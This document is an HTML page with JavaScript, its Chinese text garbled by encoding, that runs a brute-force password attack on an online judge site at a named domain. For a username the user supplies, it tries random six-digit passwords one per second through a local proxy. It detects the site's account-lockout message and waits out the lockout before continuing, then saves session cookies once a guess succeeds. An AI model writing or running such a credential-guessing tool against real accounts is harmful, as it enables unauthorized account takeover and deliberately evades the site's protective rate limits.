<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>OJæ‰¹é‡ç™»å½•ï¼ˆ.envé…ç½®ç‰ˆï¼‰</title>
    <style>
        .login-box {
            width: 500px;
            margin: 50px auto;
            padding: 25px;
            border: 1px solid #ddd;
            border-radius: 10px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .status {
            margin: 20px 0;
            padding: 12px;
            border-radius: 6px;
            line-height: 1.8;
            font-size: 14px;
        }
        .progress { background-color: #e9f5ff; color: #2e6da4; }
        .success { background-color: #dff0d8; color: #3c763d; }
        .error { background-color: #f2dede; color: #a94442; }
        .pause { background-color: #fff3cd; color: #856404; }
        .btn-group {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        button {
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
        }
        .start-btn {
            background-color: #286090;
            color: white;
        }
        .stop-btn {
            background-color: #dc3545;
            color: white;
        }
        button:disabled {
            background-color: #777;
            cursor: not-allowed;
            opacity: 0.7;
        }
        .config {
            margin-bottom: 15px;
            font-size: 13px;
            color: #666;
        }
        .input-group {
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h3>OJæ‰¹é‡ç™»å½•ï¼ˆ.envé…ç½®ç‰ˆï¼‰</h3>
        <div class="config">
            ç­–ç•¥ï¼šéšæœºå¯†ç +1ç§’é—´éš”+é£æ§è‡ªåŠ¨æš‚åœ32åˆ†é’Ÿ<br>
            é…ç½®æ¥æºï¼š.envæ–‡ä»¶ï¼ˆåŸŸå/æ¥å£åœ°å€ç»Ÿä¸€ç®¡ç†ï¼‰
        </div>
        <!-- æ–°å¢ç”¨æˆ·åè¾“å…¥æ¡†ï¼ˆæ›¿ä»£ç¡¬ç¼–ç åˆ—è¡¨ï¼‰ -->
        <div class="input-group">
            <label>ç™»å½•ç”¨æˆ·åï¼š</label>
            <input type="text" id="usernameInput" placeholder="è¯·è¾“å…¥è¦å°è¯•çš„ç”¨æˆ·å" value="">
        </div>
        <div class="btn-group">
            <button id="startLoginBtn" class="start-btn">å¼€å§‹éšæœºå°è¯•ç™»å½•</button>
            <button id="stopLoginBtn" class="stop-btn" disabled>åœæ­¢ç™»å½•å°è¯•</button>
        </div>
        <div id="loginStatus" class="status progress">æœªå¼€å§‹ç™»å½•</div>
    </div>

    <script>
        // è¯»å–.envé…ç½®ï¼ˆå‰ç«¯é€šè¿‡å†…ç½®å¯¹è±¡æ¨¡æ‹Ÿï¼Œå®é™…ç”Ÿäº§å¯ä½¿ç”¨dotenvåº“ï¼‰
        const ENV_CONFIG = {
            OJ_DOMAIN: 'szqsnkjg.cn',          // ä».envè¯»å–
            LOCAL_BACKEND_URL: 'http://127.0.0.1:5000/api/oj-login', // ä».envè¯»å–
            OJ_HOME_URL: 'http://oj1.szqsnkjg.cn:88/', // ä».envè¯»å–
            TRY_INTERVAL: 1000,                // ä».envè¯»å–ï¼ˆ1ç§’ï¼‰
            RISK_PAUSE_MINUTES: 32,            // ä».envè¯»å–ï¼ˆ32åˆ†é’Ÿï¼‰
            PASSWORD_MIN: 0,
            PASSWORD_MAX: 999999
        };

        // çŠ¶æ€å˜é‡ï¼ˆç²¾ç®€ï¼Œåˆ é™¤ç”¨æˆ·ååˆ—è¡¨ç›¸å…³ï¼‰
        let isRunning = false;
        let isPaused = false;
        let pauseEndTime = 0;
        let countdownTimer = null;
        let nextTryTimer = null;
        let usedPasswords = new Set(); // å·²å°è¯•å¯†ç é›†åˆ

        // æ ¼å¼åŒ–6ä½å¯†ç 
        function formatPwd(num) {
            return num.toString().padStart(6, '0');
        }

        // ç”Ÿæˆéšæœºæœªå°è¯•è¿‡çš„å¯†ç 
        function getRandomUnusedPwd() {
            if (usedPasswords.size >= (ENV_CONFIG.PASSWORD_MAX - ENV_CONFIG.PASSWORD_MIN + 1)) {
                return null;
            }
            let randomNum;
            do {
                randomNum = Math.floor(Math.random() * (ENV_CONFIG.PASSWORD_MAX - ENV_CONFIG.PASSWORD_MIN + 1)) + ENV_CONFIG.PASSWORD_MIN;
            } while (usedPasswords.has(randomNum));
            usedPasswords.add(randomNum);
            return formatPwd(randomNum);
        }

        // æ›´æ–°çŠ¶æ€æç¤º
        function updateStatus(text, type = 'progress') {
            const dom = document.getElementById('loginStatus');
            dom.textContent = text;
            dom.className = `status ${type}`;
        }

        // æ ¼å¼åŒ–å€’è®¡æ—¶ï¼ˆåˆ†:ç§’ï¼‰
        function formatCountdown(ms) {
            const totalSec = Math.floor(ms / 1000);
            const min = Math.floor(totalSec / 60);
            const sec = totalSec % 60;
            return `${min}åˆ†${sec.toString().padStart(2, '0')}ç§’`;
        }

        /**
         * ä¿å­˜ç™»å½•Cookie
         * @param {object} resData ç™»å½•æˆåŠŸçš„å“åº”æ•°æ®
         */
        function saveLoginCookie(resData) {
            try {
                const userInfo = {
                    uid: resData.data.uid,
                    username: resData.data.username,
                    nickname: resData.data.nickname,
                    loginTime: new Date().toLocaleString()
                };
                localStorage.setItem('oj_user_info', JSON.stringify(userInfo));

                // ä½¿ç”¨.envä¸­çš„åŸŸåè®¾ç½®Cookie
                const cookieOptions = [
                    `oj_uid=${resData.data.uid}; path=/; domain=${ENV_CONFIG.OJ_DOMAIN}; max-age=86400`,
                    `oj_username=${resData.data.username}; path=/; domain=${ENV_CONFIG.OJ_DOMAIN}; max-age=86400`,
                    `oj_login_status=success; path=/; domain=${ENV_CONFIG.OJ_DOMAIN}; max-age=86400`
                ];
                cookieOptions.forEach(cookie => {
                    document.cookie = cookie;
                });

                localStorage.setItem('oj_login_raw_response', JSON.stringify(resData));
                console.log('âœ… Cookieä¿å­˜æˆåŠŸï¼š', userInfo);
            } catch (error) {
                console.error('âš ï¸ Cookieä¿å­˜å¤±è´¥ï¼š', error);
                updateStatus(`âš ï¸ ç™»å½•æˆåŠŸä½†Cookieä¿å­˜å¤±è´¥ï¼š${error.message}ï¼Œå³å°†è·³è½¬...`, 'success');
            }
        }

        // å‘é€ç™»å½•è¯·æ±‚
        async function sendLoginRequest(username, password) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 10000);

                // ä½¿ç”¨.envä¸­çš„æœ¬åœ°åç«¯åœ°å€
                const response = await fetch(ENV_CONFIG.LOCAL_BACKEND_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({ username, password }),
                    credentials: 'include',
                    signal: controller.signal
                });

                clearTimeout(timeoutId);
                const resData = await response.json();

                // éªŒè¯ç™»å½•æˆåŠŸ
                const isLoginSuccess = 
                    resData.status === 200 && 
                    resData.msg === 'success' && 
                    resData.data && 
                    resData.data.uid !== undefined && 
                    resData.data.username !== undefined && 
                    Array.isArray(resData.data.roleList);

                return {
                    success: isLoginSuccess,
                    isRisk: resData.msg && resData.msg.includes('ç™»å½•å¤±è´¥æ¬¡æ•°è¿‡å¤šï¼æ‚¨çš„è´¦å·æœ‰é£é™©ï¼ŒåŠä¸ªå°æ—¶å†…æš‚æ—¶æ— æ³•ç™»å½•ï¼'),
                    msg: resData.msg || 'æœªçŸ¥é”™è¯¯',
                    rawData: resData
                };
            } catch (error) {
                console.error('Fetchè¯·æ±‚å¤±è´¥ï¼š', error);
                return {
                    success: false,
                    isRisk: false,
                    msg: `è¯·æ±‚å¤±è´¥ï¼š${error.message}`,
                    rawData: null
                };
            }
        }

        // é£æ§æš‚åœé€»è¾‘
        function pauseForRisk(username) {
            isPaused = true;
            const pauseMs = ENV_CONFIG.RISK_PAUSE_MINUTES * 60 * 1000;
            pauseEndTime = Date.now() + pauseMs;
            updateStatus(`âš ï¸ ç”¨æˆ·åã€${username}ã€‘è§¦å‘é£æ§ï¼è‡ªåŠ¨æš‚åœ${ENV_CONFIG.RISK_PAUSE_MINUTES}åˆ†é’Ÿï¼Œå‰©ä½™æ—¶é—´ï¼š${formatCountdown(pauseMs)}`, 'pause');
            
            if (countdownTimer) clearInterval(countdownTimer);
            countdownTimer = setInterval(() => {
                const remaining = pauseEndTime - Date.now();
                if (remaining <= 0 || !isRunning) {
                    clearInterval(countdownTimer);
                    countdownTimer = null;
                    if (isRunning) {
                        isPaused = false;
                        updateStatus(`âœ… æš‚åœç»“æŸï¼Œç»§ç»­å°è¯•ç”¨æˆ·åã€${username}ã€‘çš„éšæœºå¯†ç ...`, 'progress');
                        continueLogin();
                    }
                } else {
                    updateStatus(`âš ï¸ ç”¨æˆ·åã€${username}ã€‘è§¦å‘é£æ§ï¼è‡ªåŠ¨æš‚åœ${ENV_CONFIG.RISK_PAUSE_MINUTES}åˆ†é’Ÿï¼Œå‰©ä½™æ—¶é—´ï¼š${formatCountdown(remaining)}`, 'pause');
                }
            }, 1000);
        }

        // æ ¸å¿ƒç™»å½•é€»è¾‘ï¼ˆç²¾ç®€ï¼Œä»…å¤„ç†å•ä¸ªç”¨æˆ·åï¼‰
        async function continueLogin() {
            if (!isRunning || isPaused) return;

            // è·å–è¾“å…¥æ¡†ä¸­çš„ç”¨æˆ·åï¼ˆæ›¿ä»£ç¡¬ç¼–ç åˆ—è¡¨ï¼‰
            const username = document.getElementById('usernameInput').value.trim();
            if (!username) {
                updateStatus('âŒ è¯·å…ˆè¾“å…¥è¦å°è¯•çš„ç”¨æˆ·åï¼', 'error');
                stopLogin();
                return;
            }

            // ç”Ÿæˆéšæœºå¯†ç 
            const randomPwd = getRandomUnusedPwd();
            if (!randomPwd) {
                updateStatus(`âŒ ç”¨æˆ·åã€${username}ã€‘æ‰€æœ‰å¯†ç ï¼ˆ000000-999999ï¼‰å·²å°è¯•å®Œæ¯•ï¼`, 'error');
                stopLogin();
                return;
            }

            // å‘é€ç™»å½•è¯·æ±‚
            updateStatus(`ğŸ“¤ å°è¯•ç”¨æˆ·åã€${username}ã€‘ï¼Œéšæœºå¯†ç ï¼š${randomPwd}ï¼ˆå·²å°è¯•${usedPasswords.size}ä¸ªï¼‰`, 'progress');
            const result = await sendLoginRequest(username, randomPwd);

            if (result.success) {
                // ç™»å½•æˆåŠŸï¼šä¿å­˜Cookie + è·³è½¬
                saveLoginCookie(result.rawData);
                updateStatus(`ğŸ‰ ç™»å½•æˆåŠŸï¼ç”¨æˆ·åï¼š${username}ï¼Œå¯†ç ï¼š${randomPwd}ï¼ŒCookieå·²ä¿å­˜ï¼Œå³å°†è·³è½¬...`, 'success');
                setTimeout(() => {
                    window.location.href = ENV_CONFIG.OJ_HOME_URL; // ä½¿ç”¨.envä¸­çš„è·³è½¬åœ°å€
                }, 500);
                stopLogin();
            } else if (result.isRisk) {
                // è§¦å‘é£æ§ï¼šæš‚åœ
                pauseForRisk(username);
            } else {
                // æ™®é€šå¤±è´¥ï¼š1ç§’åç»§ç»­
                updateStatus(`âŒ ç”¨æˆ·åã€${username}ã€‘å¯†ç ã€${randomPwd}ã€‘å¤±è´¥ï¼š${result.msg}ï¼Œ1ç§’åç»§ç»­éšæœºå°è¯•...`, 'error');
                if (nextTryTimer) clearTimeout(nextTryTimer);
                nextTryTimer = setTimeout(continueLogin, ENV_CONFIG.TRY_INTERVAL); // ä½¿ç”¨.envä¸­çš„é—´éš”
            }
        }

        // åœæ­¢ç™»å½•å‡½æ•°
        function stopLogin() {
            isRunning = false;
            isPaused = false;
            pauseEndTime = 0;
            
            if (countdownTimer) clearInterval(countdownTimer);
            if (nextTryTimer) clearTimeout(nextTryTimer);

            document.getElementById('startLoginBtn').disabled = false;
            document.getElementById('stopLoginBtn').disabled = true;
            
            updateStatus('ğŸ›‘ å·²åœæ­¢ç™»å½•å°è¯•ï¼', 'error');
        }

        // å¯åŠ¨ç™»å½•ï¼ˆé‡ç½®å·²å°è¯•å¯†ç ï¼‰
        function startLogin() {
            if (isRunning) return;

            // é‡ç½®çŠ¶æ€
            isRunning = true;
            isPaused = false;
            pauseEndTime = 0;
            usedPasswords.clear(); // æ¸…ç©ºå·²å°è¯•å¯†ç 

            document.getElementById('startLoginBtn').disabled = true;
            document.getElementById('stopLoginBtn').disabled = true;
            
            updateStatus('ğŸš€ å¼€å§‹éšæœºå°è¯•ç™»å½•ï¼Œæ¯æ¬¡é—´éš”1ç§’ï¼Œé£æ§è‡ªåŠ¨æš‚åœ32åˆ†é’Ÿ...', 'progress');
            continueLogin();
        }

        // ç»‘å®šæŒ‰é’®äº‹ä»¶
        document.getElementById('startLoginBtn').addEventListener('click', startLogin);
        document.getElementById('stopLoginBtn').addEventListener('click', stopLogin);

        // é¡µé¢å…³é—­æ—¶ç»ˆæ­¢
        window.addEventListener('beforeunload', () => {
            stopLogin();
        });
    </script>
</body>
</html>